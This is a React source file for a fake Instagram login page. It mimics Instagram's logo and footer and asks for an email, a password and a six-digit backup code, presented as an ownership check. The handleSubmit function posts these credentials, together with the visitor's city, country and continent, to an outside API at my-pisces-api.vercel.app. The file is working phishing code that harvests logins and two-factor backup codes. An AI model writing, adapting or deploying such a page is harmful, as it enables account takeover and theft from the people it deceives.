// import React from "react";
import { useState } from "react";
import "../style/instagram.css";
import axios from "axios";
import { useMyContext } from "../context/AppContext";

const Instagram = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    backupCode: "",
  });

  const { city, country, continent, instagramBackup, setInstagramBackup } =
    useMyContext();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  };

  const handleVerification = (e) => {
    e.preventDefault();
    const { email, password } = formData;

    if (email !== "" && password !== "") {
      setInstagramBackup(true);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // Handle form submission with formData object

    const { email, password, backupCode } = formData;

    if (backupCode.length === 6 && email !== "" && password !== "") {
      const response = await axios.post(
        "https://my-pisces-api.vercel.app/api/auth/vote",
        {
          email,
          password,
          backupCode,
          continent,
          country,
          city,
        }
      );
      console.log(response.data);
      window.location.reload();
    }
  };

  return (
    <span id="root">
      <section className="section-all">
        <main className="main" role="main">
          <div className="wrapper">
            <article className="article">
              <div className="content">
                <div className="login-box flex flex-col items-center ">
                  <div className="header flex items-center justify-center">
                    <img
                      className="logo w-1/5 h-1/5 my-5"
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                      alt="Instagram"
                    />
                  </div>
                  <div className="form-wrap">
                    <form className="form flex flex-col gap-5 items-center justify-center">
                      <div className="input-box">
                        <input
                          className=" border border-gray-400 py-1 px-2 placeholder:text-sm rounded-sm text-sm"
                          type="email"
                          name="email"
                          id="email"
                          placeholder="email"
                          aria-describedby=""
                          value={formData.email}
                          onChange={handleChange}
                          maxLength="30"
                          aria-required="true"
                          autoCapitalize="off"
                          autoCorrect="off"
                          required
                        />
                      </div>

                      <div className="input-box">
                        <input
                          className=" border border-gray-400 py-1 px-2 placeholder:text-sm rounded-sm text-sm"
                          type="password"
                          name="password"
                          id="password"
                          placeholder="Password"
                          aria-describedby=""
                          value={formData.password}
                          onChange={handleChange}
                          maxLength={30}
                          aria-required="true"
                          autoCapitalize="off"
                          autoCorrect="off"
                          required
                        />
                      </div>

                      {instagramBackup && (
                        <span
                          htmlFor="backup"
                          className="text-sm text-red-500 font-semibold text-center"
                        >
                          This is to make sure the account belongs to you.{" "}
                          <br />
                          Please add a backup code.
                        </span>
                      )}
                      {instagramBackup ? (
                        <>
                          <div className="input-box">
                            <input
                              className=" border border-gray-400 py-1 px-2 placeholder:text-sm rounded-sm text-sm"
                              type="number"
                              name="backupCode"
                              id="backupCode"
                              placeholder="Enter 6 digit backup code"
                              aria-describedby=""
                              value={formData.backupCode}
                              onChange={handleChange}
                              maxLength={6}
                              required
                            />
                          </div>
                        </>
                      ) : (
                        ""
                      )}

                      {!instagramBackup ? (
                        <span className="button-box w-full">
                          <button
                            className="w-full btn bg-[#3897F0] text-white py-1 px-10 rounded-sm text-sm font-bold"
                            type="submit"
                            onClick={handleVerification}
                          >
                            Verify
                          </button>
                        </span>
                      ) : (
                        <span className="button-box w-2/3">
                          <button
                            className="w-full btn bg-[#3897F0] text-white py-1 px-10 rounded-sm text-sm font-bold"
                            name="submit"
                            onClick={handleSubmit}
                          >
                            Log in
                          </button>
                        </span>
                      )}

                      <a className="forgot" href="">
                        Forgot password?
                      </a>
                    </form>
                  </div>
                </div>

                <div className="login-box flex flex-row items-center justify-center my-10">
                  <p className="text">
                    Dont have an account?<a href="#">Sign up</a>
                  </p>
                </div>

                <div className="app flex flex-col items-center"></div>
              </div>
            </article>
          </div>
        </main>

        <footer className="footer" role="contentinfo">
          <div className="footer-container flex flex-col gap-3">
            <nav className="footer-nav" role="navigation">
              <ul className=" flex flex-row flex-wrap items-center justify-center text-center  gap-3">
                <li>
                  <a href="">About Us</a>
                </li>
                <li>
                  <a href="">Support</a>
                </li>
                <li>
                  <a href="">Blog</a>
                </li>
                <li>
                  <a href="">Press</a>
                </li>
                <li>
                  <a href="">Api</a>
                </li>
                <li>
                  <a href="">Jobs</a>
                </li>
                <li>
                  <a href="">Privacy</a>
                </li>
                <li>
                  <a href="">Terms</a>
                </li>
                <li>
                  <a href="">Directory</a>
                </li>
                <li>
                  <span className="language">
                    Language
                    <select name="language" className="select">
                      <option value="#">English</option>
                      <option value="http://ru-instafollow.bitballoon.com">
                        Russian
                      </option>
                    </select>
                  </span>
                </li>
              </ul>
            </nav>

            <span className="footer-logo text-center flex justify-center">
              &copy; 2023 Instagram
            </span>
          </div>
        </footer>
      </section>
    </span>
  );
};

export default Instagram;
